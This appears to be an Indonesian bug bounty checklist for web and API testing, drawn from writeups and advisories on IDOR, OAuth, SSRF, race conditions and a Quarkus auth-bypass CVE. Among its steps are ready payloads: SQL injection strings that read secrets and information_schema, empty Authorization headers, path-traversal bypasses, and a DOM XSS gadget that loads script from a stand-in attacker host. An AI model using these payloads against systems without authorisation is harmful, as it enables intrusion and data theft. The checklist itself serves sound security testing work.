# Checklist Web/API Bounty (lengkap)

Checklist kanonik Web/API. Gabungan thread writeup @bountywriteups 21 Nov 2026 (8 artikel), 17 Nov 2026 (10 artikel), dan 23 Nov 2026 (10 artikel), plus @Bug_Breakdown 22 Nov 2026 (header auth) dan 23 Nov 2026 (race condition kupon). Fokus pada kerentanan yang benar-benar dibayar: IDOR, broken access control, mass assignment, OAuth binding, SQLi, re-auth, race condition, dan validasi relasi. Salin dan sesuaikan per target.

---

## 0. Persiapan

- [ ] Target masuk scope program, aturan program dibaca (rate limit, dilarang scanner, dll)
- [ ] Akun A (attacker) dan akun B (victim) aktif, dua-duanya milik sendiri
- [ ] Data di A dan B diberi marker unik dan berbeda (nama, catatan, order ID)
- [ ] Proxy jalan (Burp/Caido), request-response disimpan otomatis
- [ ] Catat semua temuan ke file kerja, jangan mengandalkan ingatan

---

## 1. Mapping dulu, baru payload

Tandai setiap tempat aplikasi menerima referensi objek:

- [ ] URL query: `?id=`, `?user_id=`, `?account=`, `?invoice=`, `?order=`, `?doc=`
- [ ] Path: `/users/123`, `/orders/456/items`, `/api/v1/docs/789`
- [ ] JSON body: `{"user_id":123}`, `{"to":"..."}`, `{"owner":"..."}`
- [ ] Parameter pilih kolom: `fields=`, `columns=`, `sort=`, `order_by=`, `select=`
- [ ] Header/cookie: `X-User-Id`, `X-Account-Id`, `X-Tenant-Id`, `X-Api-Token`, ID di dalam session
- [ ] File: `/download?file=...`, `/invoice/123.pdf`, `/export?report=`
- [ ] GraphQL: `node(id:)`, query by id, mutation yang bawa id
- [ ] Hidden field & state di frontend
- [ ] ID bocor di list endpoint, share link, email, error message, response lain
- [ ] Endpoint print/preview/export yang meneruskan query string ke query builder. Coba tambahkan parameter status seperti draft, private, atau `post_status=any`

> UUID yang sulit ditebak bukan kontrol akses. Kalau ID-nya bocor di tempat yang sah, tetap bisa ditukar.

---

## 1b. JS bundle & auth-header edge case (0xalr, 22 Nov 2026)

Sumber: writeup "No Username. No Password. Just a Header" oleh 0xalr, live render Medium. Finding asli dan bercerita langsung, tapi target/program tidak disebut, pasangan request/response di artikel hanya screenshot yang tidak terbaca di teks, jadi angka $3.000 dan rating Critical tetap klaim penulis.

- [ ] Subdomain yang langsung redirect ke login: buka page source SEBELUM redirect selesai, jangan langsung diskip
- [ ] Download semua file JS yang dimuat, ekstrak literal endpoint (`/api/...`, `/v1/...`) jadi daftar
- [ ] Cek juga file `.map` yang terekspos di produksi. Source map bisa membuka endpoint dan logika yang tidak muncul sebagai literal di bundle minified
- [ ] 401 Unauthorized bukan bukti endpoint aman. Tanya: dari mana backend tahu user sudah autentikasi?
- [ ] Trace logika auth di JS. Perhatikan pola `Authorization: "Basic " + btoa(user + ":" + pass)`
- [ ] Cari kredensial bocor di GitHub dan URLScan, tapi jangan jadikan itu satu-satunya jalan
- [ ] Uji edge case header: kirim skema tanpa kredensial, bukan cuma base64 yang valid
  - `Authorization: Basic` (tanpa spasi, tanpa token)
  - `Authorization: Basic ` (trailing spasi)
  - `Authorization: Basic Og==` (base64 dari `:`, user dan password kosong)
  - `Authorization: Bearer`, `Authorization:`, `Authorization: basic` (huruf kecil)
  - `Authorization: Basic <random>` sebagai kontrol pembanding
- [ ] Bandingkan respons: tanpa header harus 401. Kalau dengan header kosong muncul 200 atau respons berubah, middleware cuma cek keberadaan header
- [ ] Kalau lolos, ulangi di SEMUA endpoint yang sudah dipetakan, bukan cuma satu. Uji GET/POST/PUT/PATCH/DELETE karena impact CRUD tiap method beda
- [ ] Bukti: request lengkap dengan header persis, perbandingan 200 vs 401 tanpa header, daftar endpoint terdampak, efek samping kalau data berubah atau terhapus

> Pelajaran yang tahan lama: middleware yang hanya mengecek `header exists` bukan `credentials valid`. Satu prefix skema kosong bisa membuka seluruh API.

---

## 1c. CSPT / Client-Side Path Traversal (Mahdi Salhi, 19 Nov 2026)

Sumber: writeup "One Click Full Control: Exploiting CSPT to Modify Organization" oleh Mahdi Salhi, live render Medium lengkap. Finding asli dan bercerita langsung, tapi bukti HTTP berupa screenshot yang tidak terbaca di teks, tidak ada angka bayaran, dan penulis sendiri memperkirakan "may be a Medium-severity bug". Rating dan dampaknya tetap klaim penulis.

CSPT beda dari CSRF klasik. Penyerang tidak memaksa request lintas origin, melainkan mengontrol nilai di URL yang dibaca JavaScript klien lalu dipakai untuk menyusun path request. Karena request dikirim dari origin yang sama, cookie melekat dan proteksi CSRF berbasis origin sering tidak relevan. Yang diserang adalah kontrol path, bukan token CSRF.

- [ ] Buka alur invitation / share link dengan Burp. Catat request yang otomatis terkirim saat link dibuka (sering PUT/POST yang dibangun client-side dari parameter URL)
- [ ] Tanya: nilai mana di URL yang dipakai JS untuk menyusun path endpoint? Ubah nilai itu, lihat apakah path request ikut berubah
- [ ] Payload awal: ganti ID dengan `test%2f..%2f..%2f` (`%2f` = `/`) dan amati perubahan path PUT. Coba juga hapus seluruh nilai lalu pakai `/test`
- [ ] Uji apakah traversal bisa keluar dari prefix path: susun path lengkap ke endpoint sensitif di dalam parameter id, misal `..%2f..%2fsettings%2fworkspaces%2f<id>%2ffolders%2f<uuid>%2fpermissions`
- [ ] Cari endpoint state-changing yang body-nya bisa dinolkan. Contoh kasus: PUT permissions dengan body dihapus balik `200 OK` dan `{"permissions": null}`, folder otomatis jadi Open Access
- [ ] Uji efek default: hapus body / kirim null / kirim tipe data lain, lalu cek apakah aplikasi jatuh ke state permisif (Open Access, public, role default)
- [ ] Rangkai: buat link invitation berisi path traversal yang mengarah ke endpoint sensitif, buka sebagai korban, verifikasi perubahan benar-benar terjadi di akun korban
- [ ] Bukti: URL crafted lengkap, request/response PUT yang dihasilkan browser (path, body, cookie korban), kondisi objek sebelum dan sesudah, dan fakta bahwa korban hanya perlu membuka link
- [ ] Perluas: CSPT paling berbahaya kalau di-chain dengan endpoint yang mengubah permission, role, email, webhook, atau API key. Cari PUT/POST sensitif lain di aplikasi

> Pelajaran tahan lama: nilai dari URL yang dipakai JS untuk menyusun path request adalah source yang bisa dikontrol penyerang. Uji traversal di parameter itu, lalu cari endpoint yang state-nya berubah saat body dihapus atau dinolkan.

---

## 2. IDOR matrix

Intinya: pakai ID milik B di dalam sesi A.

### Operasi yang diuji

| Operasi | Method | Yang dibuktikan |
|---------|--------|-----------------|
| Read | GET | A bisa lihat data B |
| Write | PUT, PATCH | A bisa ubah data B |
| Delete | DELETE | A bisa hapus data B |
| Create | POST | A bisa bikin objek atas nama B |

Jangan berhenti di GET. Write/delete biasanya impact lebih besar dan lebih sering terlewat.

### Tempat yang sering lupa check

- [ ] Endpoint turunan: `/{id}/preview`, `/{id}/export`, `/{id}/download`, `/{id}/summary`, `/{id}/diagram`, `/{id}/versions`, `/{id}/permissions`, `/{id}/history`
- [ ] Secondary flow: share, resend, print, webhook, notification, retry, duplicate
- [ ] Account management: ubah email, ubah nomor, ubah kata sandi, ubah recovery destination
- [ ] Mobile API (sering lebih percaya pada client daripada web)
- [ ] Endpoint lama / versi sebelumnya (`/api/v1/...` vs `/api/v2/...`)
- [ ] Token first-party. Hak aplikasi dan hak user itu dua pertanyaan berbeda, jawab keduanya

### Kalau check kelihatan ada, coba bypass

- [ ] Ganti method (GET diblokir, coba POST)
- [ ] Ganti content-type (form vs JSON)
- [ ] Array wrap: `id[]=1044`
- [ ] Parameter pollution: `?id=1043&id=1044`
- [ ] Kirim ID sendiri + ID korban, lihat mana yang menang
- [ ] Decode/encode ulang ID (base64, hex, hash yang bisa dibalik)
- [ ] Respons beda antara "not found" dan "forbidden" = ID valid bisa dibedakan

### Wildcard / boundary tidak ada sama sekali (USPS, 2018)
Kasus lama tapi polanya masih muncul. API Informed Visibility USPS menerima wildcard search, jadi satu query bisa mengembalikan semua record tanpa menebak ID siapa pun. Bukan IDOR "tukar satu ID", melainkan kontrol akses objek tidak diimplementasikan sama sekali.

- [ ] Coba parameter search kosong, `*`, `%`, regex, atau wildcard lain pada endpoint yang seharusnya hanya mengembalikan data sendiri
- [ ] Cek apakah filter "milik saya" benar-benar di database, bukan cuma di UI
- [ ] Uji endpoint tulis juga. Di kasus USPS, selain baca, API bisa meminta perubahan data akun orang lain
- [ ] Perhatikan data bersama: satu alamat bisa menarik beberapa akun sekaligus, jadi blast radius lebih luas dari satu record

### Blind IDOR

Kalau respons kosong tapi aksi seharusnya jalan, cek akun B:
- [ ] Setting berubah?
- [ ] Item hilang?
- [ ] Email/reset terkirim?

Buktinya ada di efek samping, bukan di response body.

---

## 3. Mass assignment

- [ ] Kirim request update profil/username/password, perhatiin field ekstra di response
- [ ] Kirim balik field ekstra itu di request, cek apakah perubahan nempel
- [ ] Kalau response cuma `status: OK`, fuzz parameter (Param Miner + wordlist)
- [ ] Cek dokumentasi API: `/swagger`, `/swagger-ui`, `/api-docs`, `/openapi.json`

Field yang paling sering bisa diubah:

```
role, is_admin, admin, verified, is_verified, approved, status,
credit, credits, balance, use_limit, limit, quota, plan, tier,
premium, discount, price, amount, owner_id, user_id, company_id,
email_verified, two_factor_enabled, active, disabled
```

- [ ] Parameter yang aman di satu endpoint, coba di endpoint lain
- [ ] Uji perubahan field state ke nilai wajar (misal kuota habis direset ke 0)
- [ ] Bedakan privilege escalation dan business logic flaw. Dua-duanya bisa dibayar

## 3b. Validasi relasi antarfield (Coinbase, 2022)

Sumber: case study analitis @masimshahzad, berdasarkan blog resmi Coinbase. $250.000 dibayar untuk satu perbandingan yang hilang, bukan RCE. Repro dihilangkan, jadi ini pola historis, bukan temuan penulis.

- [ ] Setiap ID bisa valid sendiri tapi salah bila digabung. Uji kombinasi lintas field, bukan field satu per satu
- [ ] Contoh konkret: order book BTC-USD plus sumber dana akun SHIB. Backend cek saldo cukup, tapi tidak cek apakah akun sumber berisi aset yang diperdagangkan
- [ ] Petakan pasangan yang harus konsisten: produk vs aset sumber, akun tujuan vs aset hasil, currency vs metode pembayaran, tenant vs user, workspace vs role
- [ ] Cek apakah UI yang menjaga konsistensi. Kalau iya, itu bukan kontrol server
- [ ] Uji chain lookup ke detail: endpoint yang menerima input publik (email, username) dan mengembalikan internal ID, lalu endpoint detail yang tidak cek ownership. Dua endpoint yang masing-masing terlihat tidak sensitif bisa jadi satu jalur ke data orang lain
- [ ] Remediasi: atomic reserve pada aset yang tepat, bukan sekadar baca saldo lalu eksekusi

> Pelajaran tahan lama: validasi relasi, bukan cuma validasi field.

## 2c. Scope organisasi pada endpoint manajemen anggota (Saurabh Tripathi, 2025)

Sumber: writeup "IDOR Leads to Deletion of Organization Owner", kasus nyata lama, klaim bayaran $800 tetap klaim penulis.

- [ ] Petakan endpoint role dan membership: promosi, demosi, hapus anggota, transfer ownership
- [ ] Uji apakah identifier anggota diterima dari organisasi lain dalam sesi organisasi sendiri
- [ ] Perhatikan identifier berurutan atau mudah ditebak, karena mengganti satu nilai bisa menjangkau anggota lintas org
- [ ] Uji efek paling jauh, bukan cuma baca: apakah owner organisasi lain bisa dihapus atau role-nya diturunkan
- [ ] Remediasi: scope pengecekan ke organisasi yang sedang aktif, bukan cuma keberadaan MemberUID

---

## 4. Parser confusion / null byte

Target: input yang dipakai ulang di request lain atau di mekanisme konfirmasi.

Payload cepat:

```
test\u0000hidden        (null byte di JSON)
test%00hidden           (URL encoded)
test\u200bhidden        (zero-width space)
test\u202Ehidden        (RTL override)
"   "                   (spasi / empty name)
```

Tempat yang perlu dicoba:
- [ ] Nama objek yang dipakai ulang untuk konfirmasi hapus/rename
- [ ] Field yang tampil beda dari nilai aslinya di UI
- [ ] Validasi panjang, filter karakter, sanitizer

Cek dampaknya: kalau ada batas jumlah objek (misal 200 token per org), objek yang gabisa dihapus bisa di-chain jadi DoS permanen.

---

## 4b. Path normalization mismatch / matrix parameter smuggling (CVE-2026-50559)

Sumber: NVD CVE-2026-50559 (HIGH 7.5, CWE-41/178/287/551/863) dan advisory vendor GHSA-qcxp-gm7m-4j5v. CVE-nya nyata, tapi spesifik untuk Quarkus dengan path-based authorization policy. One-liner "path ending" yang beredar di X bukan repro untuk CVE ini.

#### Langkah 0: fingerprinting (heuristik, bukan bukti)

Sumber: dokumen resmi Quarkus, management interface reference dan OpenAPI/Swagger UI guide.

- [ ] Cek `/q/health`, `/q/info`, `/q/openapi`, `/q/metrics` di origin yang sama. Dokumen resmi menyebut `/q` sebagai root default endpoint management, dan endpoint itu memakai server aplikasi yang sama kecuali management interface diaktifkan terpisah (default port 9000).
- [ ] `/q/openapi` yang mengembalikan `openapi: 3.1.0` dengan `info.title: Generated API` adalah sinyal kuat, karena itu nilai bawaan yang didokumentasikan.
- [ ] Root `/q` bisa diganti lewat `quarkus.management.root-path`, dan path OpenAPI bisa diganti lewat `quarkus.smallrye-openapi.path`. Tidak adanya `/q/openapi` bukan bukti bahwa target bukan Quarkus.
- [ ] Swagger UI di `/q/swagger-ui` secara default hanya tersedia di mode dev atau test. Keberadaannya di produksi berarti `quarkus.swagger-ui.always-include=true`, sekaligus temuan konfigurasi tersendiri, tapi bukan penentu versi.
- [ ] Jangan pakai header `Server` atau `X-Powered-By` sebagai signature. Dokumentasi Quarkus menyebut header tambahan harus dikonfigurasi lewat `quarkus.http.header.*`, jadi tidak ada header bawaan yang dijadikan fingerprint.
- [ ] Body error 404/401 juga tidak standar di Quarkus inti, jadi jangan dijadikan penentu. Perlakukan semua sinyal di atas sebagai hipotesis, lalu konfirmasi dari artefak aplikasi atau teknologi yang memang terlihat.

Otomatisasi: `C:/Users/TUF-GAMING/tools/quarkus_path_diff.py`.

```
python C:/Users/TUF-GAMING/tools/quarkus_path_diff.py --base-url https://TARGET_IN_SCOPE --path /api/admin --scope-confirm IN_SCOPE --out C:/Users/TUF-GAMING/reports/path-diff-nama [--static]
```

Script menolak berjalan tanpa `--scope-confirm IN_SCOPE`, tidak mengirim kredensial, menyimpan `results.json` dan `report.md`, hanya menandai `DELTA_CANDIDATE` kalau baseline 401/403/404 berubah menjadi 200 dengan body berbeda, dan menyertakan hasil `/q/*` sebagai fingerprint hint. Uji lokal: `python C:/Users/TUF-GAMING/tools/test_quarkus_path_diff.py` memakai mock 127.0.0.1 dan lolos. Tambahkan `--dry-run` dulu kalau mau melihat payload sebelum request dikirim.

Mekanisme: layer security memakai `normalizedPath()` yang hanya decode karakter unreserved RFC 3986, lalu membuang matrix parameter dengan mencari `;` literal. Handler static resource melakukan decode penuh termasuk `%2F` dan `%5C`. Beda cara decode antara security dan handler membuat policy tidak cocok dengan path yang akhirnya dibuka.

- [ ] Pastikan target benar-benar memakai path-based auth policy. Kalau hanya annotation `@RolesAllowed` tanpa policy path, pola ini tidak relevan.
- [ ] Uji encoded semicolon pada segmen terlindungi: `/api/admin%3Bbypass=true/data` dan `/api/secret%3b/data`. Baseline `/api/admin/data` harusnya 401 atau 403.
- [ ] Uji static resource: `/static-secret%2Fhtml`, `/static-secret%5Chtml`, dan double encoding `/secret%252Fconfidential.html`.
- [ ] Jangan membuang waktu pada vektor yang advisory nyatakan tidak exploitable: `%00`, `%2e%2e`, unreserved `%69`, dan `%2F` atau `%5C` pada endpoint REST (routing dan security sama-sama memakai normalizedPath).
- [ ] Wajib ada kontrol: request tanpa payload harus ditolak. Status 200 tanpa baseline bukan bukti bypass.
- [ ] Bukti: pasangan request/response yang menunjukkan endpoint sensitif terbuka tanpa auth, sebaiknya dengan perbandingan versi yang sudah patch.

> Pelajaran tahan lama: bandingkan tahap decoding di layer otorisasi dan di layer routing atau file handler. Yang diuji bukan akhiran `.json/.js` yang bikin router bingung, melainkan ketidaksesuaian normalisasi path.

### Hubungan dengan CVE-2026-39852 (pendahulu)

Sumber: NVD CVE-2026-39852 dan advisory `GHSA-rc95-pcm8-65v9`.

| Aspek | CVE-2026-39852 | CVE-2026-50559 |
|-------|----------------|----------------|
| Publish | 5 Mei 2026 | 19 Jun 2026 |
| Vektor | `;` literal di raw path, contoh `/api/admin;anything` | `%3B`, `%2F`, `%5C`, double encoding `%252F` |
| Beda layer | security memeriksa raw path yang masih menyimpan matrix parameter, RESTEasy Reactive membuang `;` sebelum match | security memakai `normalizedPath()` yang hanya decode unreserved, static handler decode penuh |
| Patch | 3.20.6.1, 3.27.3.1, 3.33.1.1, 3.34.7, 3.35.1.1, 3.35.2 | 3.20.6.2, 3.27.4.1, 3.27.5, 3.33.2.1, 3.33.3, 3.36.3, 3.37.0 |
| CVSS | 8.2 v3 / 8.8 v4 menurut GHSA | 7.5 v3 menurut NVD dan GHSA |

Kronologinya: 39852 menutup semicolon literal, 50559 menutup encoded semicolon dan encoded separator. Kalau target sudah di atas patch 39852 tapi masih di bawah patch 50559, uji bentuk encoded, bukan `;` literal. Kredit penemuan 39852 adalah GitHub Security Lab Taskflow Agent, diverifikasi manual oleh `@p-` dan `@m-y-mo` menurut advisory.

---

## 5. Session (hati-hati)

- [ ] Cek apakah session ID di-regenerate setelah login dan setelah perubahan privilege
- [ ] Cek atribut cookie: `HttpOnly`, `Secure`, `SameSite`
- [ ] Cek logout benar-benar invalidate session di server
- [ ] Cek session lama masih hidup setelah ubah password

> Punya session ID sah orang lain lalu dipakai = session hijacking, bukan otomatis session fixation. Jangan klaim fixation kalau belum dibuktikan ID-nya tetap sama sebelum dan sesudah korban login.

## 5b. Cookie remember-me dan CSRF nyata (yOnly_, 20 Nov 2026)

Sumber: writeup "I Found a CSRF Vulnerability by Analyzing Cookies" oleh yOnly_, live render Medium penuh. Finding asli, ada PoC HTML dan request yang diamati, tapi laporannya kena Duplicate di YesWeHack, tidak ada bayaran, dan bukti HTTP berupa screenshot. Penulis sendiri tidak bisa memastikan root cause pasti antara atribut SameSite dan mekanisme remember-me, jadi jangan klaim root cause lebih kuat dari bukti.

- [ ] Jangan simpulkan CSRF aman hanya dari atribut SameSite. Perhatikan cookie autentikasi sekunder: remember-me, persistent token, refresh token
- [ ] Uji apakah aplikasi tetap memproses request saat cookie session utama dihapus dan cookie sekunder dibiarkan
- [ ] Buat PoC HTML di origin lain dengan form POST ke endpoint state-changing, kirim manual, lalu amati header yang benar-benar dikirim browser
- [ ] Periksa header `Cookie` (cookie sekunder ada, session utama tidak), `Origin`, dan `Sec-Fetch-Site: cross-site`
- [ ] Verifikasi dampak nyata, bukan cuma status 200: objek sekali pakai di akun sendiri benar-benar berubah atau terhapus
- [ ] Cek validasi CSRF token di server: token kosong diterima, token tidak terikat session, token dipakai ulang, serta validasi `Origin`/`Referer` yang lemah
- [ ] Pakai akun dan objek sekali pakai. Uji beberapa aksi karena biasanya hanya satu yang lolos
- [ ] Kalau iframe gagal dimuat, jangan klaim clickjacking. Cek dulu `X-Frame-Options` atau `frame-ancestors` sebelum menyimpulkan

> Pelajaran tahan lama: konfigurasi cookie adalah petunjuk, bukan bukti. Differential yang menentukan adalah request lintas origin yang benar-benar dikirim browser.

---

## 6. OAuth / SSO: siapa yang memegang tiket login?

- [ ] Mapping alur lengkap: GraphQL start login -> Id + URL provider dengan `state` -> popup -> code -> tukar jadi `?t=` -> redeem jadi session cookie
- [ ] Bandingkan nilai tiap langkah. Kalau `t` sama persis dengan `Id` dari awal, token didapat sebelum autentikasi dan dipakai ulang buat dapet session sesudah autentikasi
- [ ] Tanya: token ini diikat ke apa? Cari cookie HttpOnly unik yang dibuat saat start login dan diwajibkan saat redeem. Kalau nggak ada, siapapun yang pegang Id bisa redeem
- [ ] Uji skenario "aku yang mulai, korban yang selesaikan, aku yang redeem"
- [ ] Uji callback: apakah allowlist benar-benar exact match, atau cuma `startsWith`? Coba tambah path segment `/x/y` di akhir callback
- [ ] Cari *unhappy path*: bikin halaman callback nggak mengenali URL-nya supaya token korban nggak kepakai (token biasanya single-use)
- [ ] Perhatikan hal yang nggak ada. Nggak ada `postMessage` di popup? Itu petunjuk, bukan jalan buntu
- [ ] Redirect URI yang didaftarkan per origin, bukan per path: path apa pun di domain itu diterima. Uji path arbitrer di callback
- [ ] Cari open redirect di domain yang sama, lalu arahkan OAuth code lewat `state` atau parameter `next` tanpa allowlist
- [ ] Cek kiriman client mobile. Kalau aplikasi mengirim result URI yang dipakai backend saat exchange, penyerang bisa mengganti redirect URI supaya code curi tetap ditukar
- [ ] Untuk target Android, baca manifest dan cek custom-scheme callback yang bisa didaftarkan aplikasi lain. Uji apakah OAuth code bisa dicegat lewat deep link, lalu ditukar menjadi session. Client secret yang tertanam di client bukan rahasia
- [ ] Tiga celah "low" bisa dirangkai jadi ATO. Jangan berhenti setelah satu celah OAuth terlihat kecil

Fix yang benar: ikatkan login attempt ke browser yang memulai (cookie unik, wajib saat redeem), jangan pakai ulang ID publik sebagai token redemption, callback exact match, redirect URI exact match di IdP, exchange redirect URI disimpan server untuk web dan mobile, state single-use plus PKCE, dan tujuan pascalogin pakai path relatif.

## 7. SQL injection lewat identifier, bukan value

- [ ] Cari parameter yang milih kolom: `fields=`, `columns=`, `sort=`, `order_by=`, `select=`
- [ ] Kirim nama kolom ngarang. Kalau error ngembaliin query lengkap, itu oracle gratis
- [ ] Ingat: prepared statement cuma bisa parameterisasi **value**, bukan **identifier**. Kolom yang bisa dipilih user hampir pasti string concatenation
- [ ] Payload `OR 1=1` nggak berguna kalau injection point-nya di `SELECT ...` setelah `member.`. Di situ yang diharapkan identifier, bukan kondisi
- [ ] Kalau ada prefix tetap `member.`, jangan hapus prefixnya. Ubah arti `member` dengan alias tabel lain:

```
fields=token,role FROM secrets AS member -- -
fields=table_name FROM information_schema.tables AS member -- -
```

- [ ] Cek apakah API token dari frontend (misal `NEXT_PUBLIC_*`) benar-benar mati. Respons 400 "Tenant not found" bukan 401 berarti token sudah lolos auth
- [ ] Kumpulkan potongan dari sumber berbeda: API token dari parent + `X-Tenant-Id` dari request acquisition. Dua dead end bisa jadi satu kunci
- [ ] Kalau backend dipakai bareng banyak brand/tenant, dampaknya lintas tenant. Uji dengan header tenant yang berbeda
- [ ] Berhenti begitu injection terkonfirmasi. Jangan dump seluruh database

## 7b. SSRF redirect bypass pada allowlist (Sumit Raj, 25 Okt 2026)

Sumber: writeup "SSRF: A Sneaky Way to Bypass URL Filters Using HTTP Redirects". Panduan dengan demo lokal dan contoh request, bukan temuan pada host nyata. Pakai sebagai hipotesis.

- [ ] Uji apakah validator memeriksa hanya URL pertama, lalu HTTP client mengikuti 302 ke tujuan lain
- [ ] Siapkan redirect server sendiri yang mengarah ke host yang diblokir, lalu kirim URL yang diizinkan ke endpoint fetch
- [ ] Bandingkan respons dengan URL langsung ke host yang diblokir. Kalau yang lewat redirect lolos, allowlist tidak mengikuti hop kedua
- [ ] Uji juga redirect relatif, protokol berbeda, dan URL dengan userinfo
- [ ] Bukti: request awal, respons 302, request hop kedua, dan efek samping yang diizinkan program. Callback ke server sendiri hanya membuktikan fetch terjadi

## 7c. Blind SSRF di jalur pembuatan sekunder dan time-based port scan (Anas NadY, Apple HOF Agustus 2026)

Sumber: thread @Bug_Breakdown 23 November 2026 dan artikel Anas NadY di Infosec Write-ups, dibaca lewat live render karena Jina kena 403. Finding asli, sudah diperbaiki, dan mendapat Apple Hall of Fame. UUID serta detail request di artikel di-redacted, jadi angka waktu respons di bawah adalah narasi penulis, bukan hasil pengujian kita.

- [ ] Petakan semua jalur untuk membuat atau mengedit objek yang sama. Alur utama yang aman tidak membuktikan alur alternatif ikut aman
- [ ] Cari field yang tersembunyi di menu More Options, wizard alternatif, alur "tanpa X", endpoint edit, draft, dan save
- [ ] Intercept request yang mengirim URL ke backend, bukan cuma form yang terlihat. Contoh kasus ini: `PUT /podcasts/pcc/v1/shows/{uuid}` dengan parameter `feedUrl`
- [ ] Uji differential: alur utama mengembalikan 403 tetapi alur sekunder menerima URL yang sama. Itu sinyal kuat validasi tidak terpusat
- [ ] Kalau response body tidak dikembalikan, perlakukan sebagai blind dan ukur latency untuk tiga kelas target: URL publik valid sebagai baseline, IP internal dengan port terbuka atau filtered, dan IP internal dengan port tertutup
- [ ] Pola waktu dari kasus ini: publik sekitar 300 ms, `http://127.0.0.1:80` lebih dari 5.000 ms karena connection timeout, `http://127.0.0.1:65535` di bawah 1.000 ms karena connection refused
- [ ] Ulangi 3 sampai 5 kali per target supaya tidak tertipu jitter. Catat rentang waktunya, bukan satu angka
- [ ] Bedakan timeout dari connection refused. Keduanya membuktikan server mencoba koneksi, tapi maknanya berbeda
- [ ] Bukti minimal: request untuk tiap kelas target, tabel perbandingan waktu, dan video yang menunjukkan selisih milidetik. Nyatakan juga bahwa response body memang tidak dikembalikan
- [ ] Jangan klaim akses ke layanan internal hanya dari callback ke server sendiri atau dari latency. Itu membuktikan fetch terjadi dan port bisa dibedakan, bukan bahwa data internal terbaca
- [ ] Remediasi: allowlist hostname dan IP, blokir rentang private serta link-local, normalisasi semua penolakan ke waktu respons yang seragam, dan terapkan aturan yang sama di semua jalur pembuatan dan edit

> Pelajaran tahan lama: validasi yang dipasang hanya di jalur utama bukan kontrol. Uji jalur sekunder dan edit, lalu ukur time-based side-channel kalau responsnya blind.

## 8. Re-auth yang cuma ada di UI

- [ ] Kalau ada layar lockout / idle timeout, jangan percaya overlay dan tombol disabled. Itu presentasi, bukan kontrol
- [ ] Coba aksi sensitif langsung lewat proxy dengan session yang sudah lock: invite admin, ubah webhook, bikin API key, ubah payout
- [ ] Uji semua aksi sensitif, bukan cuma satu. Biasanya hampir semua diblokir server dan satu yang kelewat
- [ ] Cek apakah ada middleware default-deny terpusat atau check per-endpoint

## 9. Race dan attempt budget di reset code

- [ ] Attempt limit harus dihitung per recovery ticket, bukan per IP atau per akun saja
- [ ] Cek apakah counter inkrement + cek dilakukan atomik. Kalau terpisah, kirim percobaan bersamaan
- [ ] Cek apakah ticket diinvalidasi setelah budget habis, dan apakah kode berhasil dipakai dua kali
- [ ] Cek umur kode dan apakah verifikasi MFA memakai infrastruktur yang sama dengan recovery

## 9b. Race condition / TOCTOU pada state numerik (T4nv1, 23 Nov 2026)

Sumber: thread @Bug_Breakdown 23 Nov 2026. Cerita T4nv1 di Medium adalah member-only teaser. Angka $4.000 di judul vs $14.000 di isi dan sanggahan pembaca bahwa P2 itu High (bukan Critical) membuat nominal dan rating jadi klaim, bukan fakta. Pola teknisnya yang dipakai di sini.

- [ ] Petakan alur state-changing yang mengurutkan cek -> potong nilai -> tandai terpakai tanpa transaksi atomik: kupon, gift card, saldo, poin, withdraw, retry payment
- [ ] Cari endpoint kode sekali pakai; perhatikan apakah status `used` ditulis SETELAH perhitungan, bukan dalam transaksi yang sama
- [ ] Kirim N request identik lewat HTTP/2 single-packet (Burp Repeater "Send group in parallel" atau Turbo Intruder `engine=Engine.BURP2` + `gate`), bukan multithreading biasa
- [ ] Bedakan dua bentuk: identical-copies race (limit-overrun, double-spend) dan different-requests race (register-then-confirm, verifikasi email, OTP)
- [ ] Uji juga lintas endpoint: kode yang sama dipakai ulang di endpoint lain yang memakai backend berbeda
- [ ] Bukti minimal: 2+ respons 200 untuk satu kode sekali pakai, plus efek akhir di akun (total benar-benar berkurang berkali-kali)
- [ ] Remediasi yang diminta: transaksi DB atomik dengan `SELECT ... FOR UPDATE` atau distributed lock. Check di application layer saja tidak cukup di bawah konkurensi

> Pelajaran tahan lama: validasi aplikasi tanpa isolation database bukan kontrol. Kirim burst tersinkron, bukan sequential.

---

## 10. Error message sebagai peta

- [ ] "App lacks capability X" berarti ada app yang punya capability X. Uji token first-party
- [ ] "Tenant not found" berarti key sudah lolos auth
- [ ] Error yang ngembaliin query SQL ngasih tahu persis injection point-nya
- [ ] Respons beda antara "not found" dan "forbidden" ngasih tahu ID mana yang valid

## 10b. Reflected XSS: konteks dan HttpOnly (Darshan Narayan, 11 Sep 2026)

Sumber: writeup "WAF Bypass: Failed SQLi to Reflected XSS", cerita finding asli dengan sebagian bukti screenshot, target tidak disebut. Angka dan rating tidak dipakai di sini.

- [ ] Jangan berhenti di satu titik refleksi. String yang sama bisa inert di `<title>` dan hidup di `<body>`
- [ ] Petakan semua tempat input muncul di halaman sebelum menyimpulkan tidak ada XSS
- [ ] Kalau WAF memblokir `<script>`, cek apakah event handler inline seperti `onerror` lolos. Memblokir tag bukan memblokir bahasa
- [ ] Popup `alert` hanya membuktikan eksekusi. Cek atribut `HttpOnly` pada cookie session sebelum klaim pencurian session atau ATO
- [ ] Tanpa HttpOnly, tunjukkan `document.cookie` terbaca. Dengan HttpOnly, turunkan klaim ke injeksi konten atau in-page CSRF
- [ ] Respons 406 atau hasil aneh di parameter numerik belum tentu SQLi. Ikuti petunjuk aplikasi, jangan paksakan payload

## 10d. Config-driven DOM XSS dan JSON breakout dari one-liner X (feed @YXN0cm8, 23 Nov 2026)

Sumber: caption payload dari akun @YXN0cm8, hunter YesWeHack KYC yang sudah diverifikasi profilnya. Ini one-liner promosi, bukan writeup. Tidak ada request/response, nama target, timeline, atau root cause. Payload ONLYOFFICE cocok dengan gadget native yang terdokumentasi, sedangkan SSRF dan kedua XSS bersifat generik. Perlakukan semuanya sebagai hipotesis, bukan temuan tervalidasi.

### A. Skrip pihak ketiga yang mengonsumsi atribut DOM

- [ ] Fingerprint dulu: cari elemen dengan `id` atau `data-*` yang dibaca skrip consent, widget, atau loader. Contoh dari feed: `<input id=oneTrust value=true data-url=//ATTACKER/z>`
- [ ] Jangan langsung kirim payload ke target. Baca bundle skrip pihak ketiga yang dimuat halaman dan cari pembacaan `data-url`, `getAttribute`, atau `dataset` di dekat inisialisasi
- [ ] Petakan source dan sink: dari mana nilai atribut berasal (URL, parameter, field profil, konten tersimpan) dan ke mana nilainya pergi (`script src`, iframe `src`, `fetch`, `innerHTML`)
- [ ] Uji refleksi dengan nilai jinak yang unik, misal `data-url=https://<domain-kita>/probe.txt`, lalu amati apakah ada request keluar dari halaman
- [ ] Uji variasi yang tetap jelas di log: `//host`, `https://host`, `/\host`, dan URL dengan fragment. Bandingkan apakah semuanya diterima atau hanya sebagian
